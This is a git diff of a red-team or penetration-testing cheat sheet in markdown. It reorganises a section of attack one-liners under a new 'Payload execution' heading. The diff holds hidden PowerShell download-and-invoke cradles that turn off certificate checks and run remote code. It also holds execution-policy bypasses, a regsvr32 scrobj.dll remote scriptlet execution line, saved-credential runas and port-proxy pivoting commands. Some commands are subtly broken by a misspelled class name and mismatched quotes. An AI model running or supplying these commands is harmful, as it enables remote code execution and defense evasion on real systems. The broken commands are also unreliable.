@@ -593,17 +593,12 @@ on the compromised host: `netsh interface portproxy add v4tov4 listenport=33389 
 
 ### PLink on Windows
 
-## One liners
-Powershell: `powershell -w hidden -c "[System.Net.SystemPointManager]::ServerCertificateValidationCallback = { $true }; IEX ((new-object net.webclient).downloadstring('https://target/tools'))"`\
-PowerShell IWR: `powershell.exe –c “IEX (Invoke-WebRequest -SkipCertificateCheck -Method 'GET' -Uri 'https://target/tools')`\
-RegSvr32: `regsvr32.exe /s /n /u /i:http://server/file.sct scrobj.dll`
-
-
-# Privesc
+# Privilege escalation
 
 ## Windows
 https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md#discovery
 Runas saved credentials: `runas /savecred /user:<domain\username> cmd.exe`\
+
 
 ### Native CMD Host enum
 ```
@@ -660,3 +655,15 @@ Use stdin and GC: Get-Content .\file.ps1 | PowerShell.exe –NoProfile –Comman
 New-NetFirewallRule -DisplayName "name" -RemoteAddress -Direction Outbound -Action Block -Enabled True
 New-NetFirewallRule -DisplayName "name" -Program program.exe -Direction Outbound -Action Block -Enabled True
 ```
+
+# Payload execution:
+
+## PowerShell
+Download and invoke (Dot Net): `powershell -w hidden -c "[System.Net.SystemPointManager]::ServerCertificateValidationCallback = { $true }; IEX ((new-object net.webclient).downloadstring('https://target/tools'))"`\
+Download and invoke (IWR): `powershell.exe –c “IEX (Invoke-WebRequest -SkipCertificateCheck -Method 'GET' -Uri 'https://target/tools')`\
+Exection bypass: `powershell.exe -ep bypass -c '{Powershell to execute}'`\
+Exection bypass: `powershell.exe -ep bypass -f file_to_open.ps1`\
+STDin and Get-Content: `Get-Content .\file.ps1 | PowerShell.exe –NoProfile -ExecutionPolicy ByPass –Command -`
+
+## Scrobly doo dobble job job whatever
+RegSvr32: `regsvr32.exe /s /n /u /i:http://server/file.sct scrobj.dll`
